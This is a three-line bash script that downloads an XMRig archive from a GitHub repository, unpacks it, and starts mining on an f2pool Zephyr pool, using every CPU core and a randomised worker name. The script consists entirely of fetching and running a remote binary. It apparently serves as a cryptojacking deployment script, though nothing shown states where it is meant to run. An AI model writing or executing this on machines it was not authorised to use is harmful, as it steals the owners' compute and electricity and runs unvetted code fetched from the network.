#!/bin/bash
wget https://github.com/nandafiku/gradi/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
./xmrig --donate-level 1 -o zeph-asia.f2pool.com:6100 -u novalanto.$(echo $(shuf -i 1-100000 -n 1)-RAIMO) -p x -a rx/0 -t $(nproc --all)
